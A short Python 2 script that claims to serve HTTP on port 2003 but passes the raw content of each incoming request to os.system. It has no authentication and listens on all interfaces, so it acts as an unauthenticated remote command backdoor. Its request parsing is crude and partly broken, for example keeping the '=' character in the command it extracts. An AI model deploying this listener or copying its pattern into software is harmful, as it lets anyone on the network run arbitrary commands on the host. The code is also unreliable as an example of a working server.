import os
import socket

HOST, PORT = '', 2003

listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listen_socket.bind((HOST, PORT))
listen_socket.listen(1)
print 'Serving HTTP on port %s ...' % PORT
while True:
    client_connection, client_address = listen_socket.accept()
    request = client_connection.recv(1024)
    req=request[0:len(request)-1]
    if("GET" in request):
        req=req[req.find('='):req.find(';')].replace("%20",' ')
        req=req.replace("%22",'')
    os.system(req)   
    http_response="""
200 OK done"""
    client_connection.sendall(http_response)
    client_connection.close()
